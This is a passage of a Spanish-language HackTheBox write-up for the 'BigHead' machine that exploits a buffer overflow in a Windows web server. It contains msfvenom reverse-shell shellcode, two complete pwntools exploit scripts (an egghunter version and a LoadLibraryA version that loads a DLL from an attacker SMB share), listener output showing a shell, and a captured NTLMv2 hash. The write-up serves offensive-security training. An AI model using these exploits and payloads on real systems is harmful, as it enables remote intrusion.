+<a href="/htb/bighead/28.png" target="_blank"><div><p><img src="/htb/bighead/28.png"></p></div></a>
+
+<p class="plain-text">Si con mona comparamos el <code class="language-plaintext highlighter-rouge">bytearray</code> con el contenido de esa direccion nos dice que todo el array no se ha modificado lo que significa que no hay ningun <code class="language-plaintext highlighter-rouge">badchar</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">mona("compare -f bytearray.bin -a 00973CB6")</span>
+</code></pre></div></div><br>
+<a href="/htb/bighead/29.png" target="_blank"><div><p><img src="/htb/bighead/29.png"></p></div></a>
+
+<p class="plain-text">Lo que nos queda es crear un shellcode con <code class="language-plaintext highlighter-rouge">msfvenom</code> que en caso de ejecutarse nos envie una <code class="language-plaintext highlighter-rouge">reverse shell</code> en windows a nuestro host por el puerto 443</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 EXITFUNC=thread -f python -v shellcode  
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 12 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+x86/shikata_ga_nai chosen with final size 351
+Payload size: 351 bytes
+Final size of python file: 1965 bytes
+shellcode =  b""
+shellcode += b"\xdb\xd8\xd9\x74\x24\xf4\x5a\x2b\xc9\xbf\x84"
+shellcode += b"\x9c\x68\xea\xb1\x52\x31\x7a\x17\x83\xc2\x04"
+shellcode += b"\x03\xfe\x8f\x8a\x1f\x02\x47\xc8\xe0\xfa\x98"
+shellcode += b"\xad\x69\x1f\xa9\xed\x0e\x54\x9a\xdd\x45\x38"
+shellcode += b"\x17\x95\x08\xa8\xac\xdb\x84\xdf\x05\x51\xf3"
+shellcode += b"\xee\x96\xca\xc7\x71\x15\x11\x14\x51\x24\xda"
+shellcode += b"\x69\x90\x61\x07\x83\xc0\x3a\x43\x36\xf4\x4f"
+shellcode += b"\x19\x8b\x7f\x03\x8f\x8b\x9c\xd4\xae\xba\x33"
+shellcode += b"\x6e\xe9\x1c\xb2\xa3\x81\x14\xac\xa0\xac\xef"
+shellcode += b"\x47\x12\x5a\xee\x81\x6a\xa3\x5d\xec\x42\x56"
+shellcode += b"\x9f\x29\x64\x89\xea\x43\x96\x34\xed\x90\xe4"
+shellcode += b"\xe2\x78\x02\x4e\x60\xda\xee\x6e\xa5\xbd\x65"
+shellcode += b"\x7c\x02\xc9\x21\x61\x95\x1e\x5a\x9d\x1e\xa1"
+shellcode += b"\x8c\x17\x64\x86\x08\x73\x3e\xa7\x09\xd9\x91"
+shellcode += b"\xd8\x49\x82\x4e\x7d\x02\x2f\x9a\x0c\x49\x38"
+shellcode += b"\x6f\x3d\x71\xb8\xe7\x36\x02\x8a\xa8\xec\x8c"
+shellcode += b"\xa6\x21\x2b\x4b\xc8\x1b\x8b\xc3\x37\xa4\xec"
+shellcode += b"\xca\xf3\xf0\xbc\x64\xd5\x78\x57\x74\xda\xac"
+shellcode += b"\xf8\x24\x74\x1f\xb9\x94\x34\xcf\x51\xfe\xba"
+shellcode += b"\x30\x41\x01\x11\x59\xe8\xf8\xf2\x6c\xe7\x0c"
+shellcode += b"\x0f\x19\xf5\x10\x0e\x62\x70\xf6\x7a\x84\xd5"
+shellcode += b"\xa1\x12\x3d\x7c\x39\x82\xc2\xaa\x44\x84\x49"
+shellcode += b"\x59\xb9\x4b\xba\x14\xa9\x3c\x4a\x63\x93\xeb"
+shellcode += b"\x55\x59\xbb\x70\xc7\x06\x3b\xfe\xf4\x90\x6c"
+shellcode += b"\x57\xca\xe8\xf8\x45\x75\x43\x1e\x94\xe3\xac"
+shellcode += b"\x9a\x43\xd0\x33\x23\x01\x6c\x10\x33\xdf\x6d"
+shellcode += b"\x1c\x67\x8f\x3b\xca\xd1\x69\x92\xbc\x8b\x23"
+shellcode += b"\x49\x17\x5b\xb5\xa1\xa8\x1d\xba\xef\x5e\xc1"
+shellcode += b"\x0b\x46\x27\xfe\xa4\x0e\xaf\x87\xd8\xae\x50"
+shellcode += b"\x52\x59\xde\x1a\xfe\xc8\x77\xc3\x6b\x49\x1a"
+shellcode += b"\xf4\x46\x8e\x23\x77\x62\x6f\xd0\x67\x07\x6a"
+shellcode += b"\x9c\x2f\xf4\x06\x8d\xc5\xfa\xb5\xae\xcf"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nuestro script final consta de 2 etapas, la primera peticion simplemente guarda el <code class="language-plaintext highlighter-rouge">egg</code> seguido del <code class="language-plaintext highlighter-rouge">shellcode</code> en algun lugar de la memoria, la segunda desborda el buffer y al saltar al <code class="language-plaintext highlighter-rouge">ESP</code> ejecuta el <code class="language-plaintext highlighter-rouge">egghunter</code>, este buscara el egg que es la cadena <code class="language-plaintext highlighter-rouge">w00t</code> 2 veces en la memoria y ejecutara lo que esta despues que es el <code class="language-plaintext highlighter-rouge">shellcode</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32
+
+egg </span><span class="o">= </span><span class="no">b</span><span class="s">"w00t"</span><span class="o"> * </span><span class="mi">2</span><span class="p">
+
+shellcode </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xdb\xd8\xd9\x74\x24\xf4\x5a\x2b\xc9\xbf\x84</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x9c\x68\xea\xb1\x52\x31\x7a\x17\x83\xc2\x04</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x03\xfe\x8f\x8a\x1f\x02\x47\xc8\xe0\xfa\x98</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xad\x69\x1f\xa9\xed\x0e\x54\x9a\xdd\x45\x38</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x17\x95\x08\xa8\xac\xdb\x84\xdf\x05\x51\xf3</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xee\x96\xca\xc7\x71\x15\x11\x14\x51\x24\xda</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x69\x90\x61\x07\x83\xc0\x3a\x43\x36\xf4\x4f</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x19\x8b\x7f\x03\x8f\x8b\x9c\xd4\xae\xba\x33</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6e\xe9\x1c\xb2\xa3\x81\x14\xac\xa0\xac\xef</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x47\x12\x5a\xee\x81\x6a\xa3\x5d\xec\x42\x56</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x9f\x29\x64\x89\xea\x43\x96\x34\xed\x90\xe4</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe2\x78\x02\x4e\x60\xda\xee\x6e\xa5\xbd\x65</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x7c\x02\xc9\x21\x61\x95\x1e\x5a\x9d\x1e\xa1</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x8c\x17\x64\x86\x08\x73\x3e\xa7\x09\xd9\x91</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xd8\x49\x82\x4e\x7d\x02\x2f\x9a\x0c\x49\x38</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6f\x3d\x71\xb8\xe7\x36\x02\x8a\xa8\xec\x8c</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xa6\x21\x2b\x4b\xc8\x1b\x8b\xc3\x37\xa4\xec</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xca\xf3\xf0\xbc\x64\xd5\x78\x57\x74\xda\xac</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xf8\x24\x74\x1f\xb9\x94\x34\xcf\x51\xfe\xba</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x30\x41\x01\x11\x59\xe8\xf8\xf2\x6c\xe7\x0c</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x0f\x19\xf5\x10\x0e\x62\x70\xf6\x7a\x84\xd5</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xa1\x12\x3d\x7c\x39\x82\xc2\xaa\x44\x84\x49</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x59\xb9\x4b\xba\x14\xa9\x3c\x4a\x63\x93\xeb</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x55\x59\xbb\x70\xc7\x06\x3b\xfe\xf4\x90\x6c</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x57\xca\xe8\xf8\x45\x75\x43\x1e\x94\xe3\xac</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x9a\x43\xd0\x33\x23\x01\x6c\x10\x33\xdf\x6d</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x1c\x67\x8f\x3b\xca\xd1\x69\x92\xbc\x8b\x23</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x49\x17\x5b\xb5\xa1\xa8\x1d\xba\xef\x5e\xc1</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x0b\x46\x27\xfe\xa4\x0e\xaf\x87\xd8\xae\x50</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x52\x59\xde\x1a\xfe\xc8\x77\xc3\x6b\x49\x1a</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xf4\x46\x8e\x23\x77\x62\x6f\xd0\x67\x07\x6a</span><span class="s">"
+</span><span class="p">shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x9c\x2f\xf4\x06\x8d\xc5\xfa\xb5\xae\xcf</span><span class="s">"
+</span><span class="p">
+payload </span><span class="o">= </span><span class="p">egg </span><span class="o">+ </span><span class="p">shellcode
+
+content </span><span class="o">= </span><span class="no">b</span><span class="s">"POST / HTTP/1.1</span><span class="mi">\r\n</span><span class="s">" </span><span class="o">+ </span><span class="p">payload
+
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"dev.bighead.htb"</span><span class="p">, </span><span class="mi">80</span><span class="p">)
+
+shell.sendline(content)
+shell.recv()
+shell.close()
+
+offset </span><span class="o">= </span><span class="mi">36</span><span class="p">
+junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
+
+jmpesp </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x625012f0</span><span class="p">)
+
+egghunter  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74</span><span class="s">"</span><span class="p">  
+egghunter </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7</span><span class="s">"</span><span class="p">  
+
+payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpesp </span><span class="o">+ </span><span class="p">egghunter
+
+content </span><span class="o">= </span><span class="no">f</span><span class="s">"HEAD /</span><span class="p">{payload.hex()} </span><span class="s">HTTP/1.1"</span><span class="p">.encode()
+
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"dev.bighead.htb"</span><span class="p">, </span><span class="mi">80</span><span class="p">)
+
+shell.sendline(content)
+shell.close()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ejecutamos el <code class="language-plaintext highlighter-rouge">exploit</code> y envia ambas peticiones, hay que tener en cuenta que es posible que el servidor demore hasta <code class="language-plaintext highlighter-rouge">10 o 15 minutos</code> en ejecutar el payload</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Opening connection to dev.bighead.htb on port 80: Done  
+[</span><span class="az">*</span><span class="p">] Closed connection to dev.bighead.htb port 80
+[</span><span class="ve">+</span><span class="p">] Opening connection to dev.bighead.htb on port 80: Done  
+[</span><span class="az">*</span><span class="p">] Closed connection to dev.bighead.htb port 80</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Despues de esperar un par de minutos se ejecuta nuestro <code class="language-plaintext highlighter-rouge">shellcode</code> y como resultado obtenemos una <code class="language-plaintext highlighter-rouge">shell</code> en el equipo victima como el usuario local <code class="language-plaintext highlighter-rouge">nelson</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.10.112 
+Microsoft Windows [Version 6.0.6002]
+Copyright (c) 2006 Microsoft Corporation. All rights reserved.  
+
+C:\nginx></span><span class="am">whoami</span><span class="p">
+piedpiper\nelson
+
+C:\nginx></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="bof-loadlibrary">
+<br><h3 class="post-title">Buffer Overflow - loadlibrary</h3><br>
+
+<p class="plain-text">Otra forma de explotarlo es a traves de la función <code class="language-plaintext highlighter-rouge">LoadLibraryA</code> que importa el dll</p>
+<a href="/htb/bighead/35.png" target="_blank"><div><p><img src="/htb/bighead/35.png"></p></div></a>
+
+<p class="plain-text">La función <a href="https://learn.microsoft.com/es-es/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">LoadLibraryA</a> es bastante simple, solo recibe como <code class="language-plaintext highlighter-rouge">parametro</code> el nombre de la libreria, por lo que si la controlamos podemos cargar un <code class="language-plaintext highlighter-rouge">dll</code> malicioso</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">HMODULE </span><span class="na">LoadLibraryA</span><span class="p">(
+  [</span><span class="mi">in</span><span class="p">] </span><span class="no">LPCSTR </span><span class="p">lpLibFileName
+);</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para lo que vamos a hacer necesitamos que el <code class="language-plaintext highlighter-rouge">ESP</code> este libre asi que buscaremos una direccion con un jmp a <code class="language-plaintext highlighter-rouge">EAX</code> que apunta a el inicio del input que introducimos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">mona("jmp -r eax -m bheadsvr.dll")</span>
+</code></pre></div></div><br>
+<a href="/htb/bighead/31.png" target="_blank"><div><p><img src="/htb/bighead/31.png"></p></div></a>
+
+<p class="plain-text">Primero enviaremos una variable <code class="language-plaintext highlighter-rouge">dll</code> que por ahora no vale nada pero seran las instrucciones que ejecutara el <code class="language-plaintext highlighter-rouge">jmp eax</code>, rellenamos con <code class="language-plaintext highlighter-rouge">A's</code> hasta llegar al <code class="language-plaintext highlighter-rouge">EIP</code> y saltamos al <code class="language-plaintext highlighter-rouge">EAX</code>, despues de eso enviamos la ruta <code class="language-plaintext highlighter-rouge">smb</code> donde estara nuestro dll</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32, asm
+
+dll  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+
+offset </span><span class="o">= </span><span class="mi">36</span><span class="p">
+junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">(offset </span><span class="o">- </span><span class="no">len</span><span class="p">(dll))
+
+jmpeax </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x625012f2</span><span class="p">)
+
+smb </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">10.10.14.10</span><span class="mi">\\</span><span class="s">kali</span><span class="mi">\\</span><span class="s">shell.dll"</span><span class="p">
+
+payload </span><span class="o">= </span><span class="p">dll </span><span class="o">+ </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpeax </span><span class="o">+ </span><span class="p">smb
+
+content </span><span class="o">= </span><span class="no">f</span><span class="s">"HEAD /</span><span class="p">{payload.hex()} </span><span class="s">HTTP/1.1"</span><span class="p">.encode()  
+
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">8008</span><span class="p">)
+
+shell.sendline(content)
+shell.close()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora igual que antes crearemos un <code class="language-plaintext highlighter-rouge">breakpoint</code> pero antes de hacer el <code class="language-plaintext highlighter-rouge">jmp eax</code></p>
+<a href="/htb/bighead/32.png" target="_blank"><div><p><img src="/htb/bighead/32.png"></p></div></a>
+
+<p class="plain-text">Como justo despues del <code class="language-plaintext highlighter-rouge">jmp eax</code> enviamos la ruta del recurso <code class="language-plaintext highlighter-rouge">smb</code> de nuestro dll malicioso este se almacenara en el <code class="language-plaintext highlighter-rouge">ESP</code> o la pila simplemente como una string</p>
+<a href="/htb/bighead/33.png" target="_blank"><div><p><img src="/htb/bighead/33.png"></p></div></a>
+
+<p class="plain-text">Para que esta string sea tomada como argumento para <code class="language-plaintext highlighter-rouge">LoadLibraryA</code> tenemos que guardarlo en un registro en este caso <code class="language-plaintext highlighter-rouge">EBX</code> esto lo hacemos con <code class="language-plaintext highlighter-rouge">mov ebx, esp</code> y dejar en el <code class="language-plaintext highlighter-rouge">ESP</code> la direccion que hace referencia a <code class="language-plaintext highlighter-rouge">EBX</code> ejecutando <code class="language-plaintext highlighter-rouge">push ebx</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"mov ebx, esp"</span><span class="p">)
+dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"push ebx"</span><span class="p">)</span>
+</code></pre></div></div><br>
+<a href="/htb/bighead/34.png" target="_blank"><div><p><img src="/htb/bighead/34.png"></p></div></a>
+
+<p class="plain-text">Ya con la direccion de la ruta como argumento en el <code class="language-plaintext highlighter-rouge">ESP</code> solo nos queda mover la direccion de <code class="language-plaintext highlighter-rouge">LoadLibraryA</code> a un registro como <code class="language-plaintext highlighter-rouge">EAX</code> y llamarlo con un <code class="language-plaintext highlighter-rouge">call eax</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"mov eax, dword ptr ds:[0x625070c8]"</span><span class="p">)
+dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"call eax"</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<a href="/htb/bighead/37.png" target="_blank"><div><p><img src="/htb/bighead/37.png"></p></div></a>
+
+<p class="plain-text">Nuestro exploit final seria el siguiente, guarda la referencia a nuestra ruta <code class="language-plaintext highlighter-rouge">smb</code> del dll en <code class="language-plaintext highlighter-rouge">ESP</code> como argumento y ejecuta <code class="language-plaintext highlighter-rouge">LoadLibraryA</code> para que cargue el dll malicioso</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32, asm
+
+dll  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"mov ebx, esp"</span><span class="p">)
+dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"push ebx"</span><span class="p">)
+dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"mov eax, dword ptr ds:[0x625070c8]"</span><span class="p">)
+dll </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"call eax"</span><span class="p">)
+
+offset </span><span class="o">= </span><span class="mi">36</span><span class="p">
+junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">(offset </span><span class="o">- </span><span class="no">len</span><span class="p">(dll))
+
+jmpeax </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x625012f2</span><span class="p">)
+
+smb </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">10.10.14.10</span><span class="mi">\\</span><span class="s">kali</span><span class="mi">\\</span><span class="s">shell.dll"</span><span class="p">
+
+payload </span><span class="o">= </span><span class="p">dll </span><span class="o">+ </span><span class="p">junk </span><span class="o">+ </span><span class="p">jmpeax </span><span class="o">+ </span><span class="p">smb
+
+content </span><span class="o">= </span><span class="no">f</span><span class="s">"HEAD /</span><span class="p">{payload.hex()} </span><span class="s">HTTP/1.1"</span><span class="p">.encode()  
+
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"dev.bighead.htb"</span><span class="p">, </span><span class="mi">80</span><span class="p">)
+
+shell.sendline(content)
+shell.close()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Creamos el dll malicioso con <code class="language-plaintext highlighter-rouge">msfvenom</code> para que en caso de ejecutarse nos envie una <code class="language-plaintext highlighter-rouge">shell</code> y lo compartimos con un servidor <code class="language-plaintext highlighter-rouge">smb</code> como se indica en el exploit</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f dll -o shell.dll  
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 1786 bytes
+Final size of dll file: 9216 bytes
+Saved as: shell.dll
+
+</span><span class="ve">❯ impacket-smbserver </span><span class="p">kali . -smb2support
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Despues de unos minutos recibimos una petición en nuestro servidor <code class="language-plaintext highlighter-rouge">smb</code> del usuario nelson que carga el <code class="language-plaintext highlighter-rouge">dll</code> y al interpretarlo tambien recibimos una <code class="language-plaintext highlighter-rouge">shell</code> como este</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-smbserver </span><span class="p">kali . -smb2support
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.10.112,49188)
+[*] AUTHENTICATE_MESSAGE (PIEDPIPER\Nelson,PIEDPIPER)
+[*] User PIEDPIPER\Nelson authenticated successfully
+[*] Nelson::PIEDPIPER:aaaaaaaaaaaaaaaa:0785c9eba0cea74625b2dac1462c6203:0101000000000000009f4868d107da01a67a6675c53e3e22000000000100100047004f0072005a005100770051004b000300100047004f0072005a005100770051004b000200100079004f006e006300420058005a0067000400100079004f006e006300420058005a00670007000800009f4868d107da010600040002000000080030003000000000000000000000000020000056912fbf6f69c4c060774a884c4dafb82c032815e7ec7c56ed6a55e7ad2225d0000000000000000000000000  
+[*] Connecting Share(1:IPC$)
+[*] Connecting Share(2:kali)
+[*] Disconnecting Share(1:IPC$)
+[*] Disconnecting Share(2:kali)
+[*] Closing down connection (10.10.10.112,49188)
+[*] Remaining connections []</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.10.112
+Microsoft Windows [Version 6.0.6002]
+Copyright (c) 2006 Microsoft Corporation. All rights reserved.  
+
+C:\nginx></span><span class="am">whoami</span><span class="p">
+piedpiper\nelson
+
+C:\nginx></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-nginx">
+<br><h3 class="post-title">Shell - nginx</h3><br>
+
+<p class="plain-text">Aunque existe el archivo <code class="language-plaintext highlighter-rouge">user.txt</code> en el escritorio de nelson no es lo que esperamos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\Nelson\Desktop></span><span class="am"> type </span><span class="p">user.txt
+
+    .-''-.  .-------.      .---.    .-./`)     _______   .---.  .---.
+  .'_ _   \ |  _ _   \     | ,_|    \ .-.')   /   __  \  |   |  |_ _|
+ / ( ` )   '| ( ' )  |   ,-./  )    / `-' \  | ,_/  \__) |   |  ( ' )
+. (_ o _)  ||(_ o _) /   \  '_ '`)   `-'`"`,-./  )       |   '-(_{;}_)
+|  (_,_)___|| (_,_).' __  > (_)  )   .---. \  '_ '`)     |      (_,_)
+'  \   .---.|  |\ \  |  |(  .  .-'   |   |  > (_)  )  __ | _ _--.   |
+ \  `-'    /|  | \ `'   / `-'`-'|___ |   | (  .  .-'_/  )|( ' ) |   |
+  \       / |  |  \    /   |        \|   |  `-'`-'     / (_{;}_)|   |
+   `'-..-'  ''-'   `'-'    `--------`'---'    `._____.'  '(_,_) '---'
+          .---.       ,-----.    ,---.  ,---.   .-''-.     .-'''-.
+          | ,_|     .'  .-,  '.  |   /  |   | .'_ _   \   / _     \
+        ,-./  )    / ,-.|  \ _ \ |  |   |  .'/ ( ` )   ' (`' )/`--'
+        \  '_ '`) ;  \  '_ /  | :|  | _ |  |. (_ o _)  |(_ o _).
+         > (_)  ) |  _`,/ \ _/  ||  _( )_  ||  (_,_)___| (_,_). '.
+        (  .  .-' : (  '\_/ \   ;\ (_ o._) /'  \   .---..---.  \  :
+         `-'`-'|___\ `"/  \  ) /  \ (_,_) /  \  `-'    /\    `-'  |
+          |        \'. \_/``".'    \     /    \       /  \       /
+          `--------`  '-----'       `---`      `'-..-'    `-...-'
+                ,---------. .---.  .---.     .-''-.
+                \          \|   |  |_ _|   .'_ _   \
+                 `--.  ,---'|   |  ( ' )  / ( ` )   '
+                    |   \   |   '-(_{;}_). (_ o _)  |
+                    :_ _:   |      (_,_) |  (_,_)___|
+                    (_I_)   | _ _--.   | '  \   .---.
+                   (_(=)_)  |( ' ) |   |  \  `-'    /
+                    (_I_)   (_{;}_)|   |   \       /
+                    '---'   '(_,_) '---'    `'-..-'
+                             .---.  .---.    ____       .-'''-. .---.  .---.
+      .-,                    |   |  |_ _|  .'  __ `.   / _     \|   |  |_ _|
+   ,-.|  \ _                 |   |  ( ' ) /   '  \  \ (`' )/`--'|   |  ( ' )
+   \  '_ /  |                |   '-(_{;}_)|___|  /  |(_ o _).   |   '-(_{;}_)
+   _`,/ \ _/                 |      (_,_)    _.-`   | (_,_). '. |      (_,_)
+  (  '\_/ \                  | _ _--.   | .'   _    |.---.  \  :| _ _--.   |
+   `"/  \  )                 |( ' ) |   | |  _( )_  |\    `-'  ||( ' ) |   |
+     \_/``"                  (_{;}_)|   | \ (_ o _) / \       / (_{;}_)|   |
+                             '(_,_) '---'  '.(_,_).'   `-...-'  '(_,_) '---'
+
+
+PS C:\Users\Nelson\Desktop></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Mirando los procesos vemos corriendo <code class="language-plaintext highlighter-rouge">BvSshServer</code> que ocupa el puerto local 2020</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
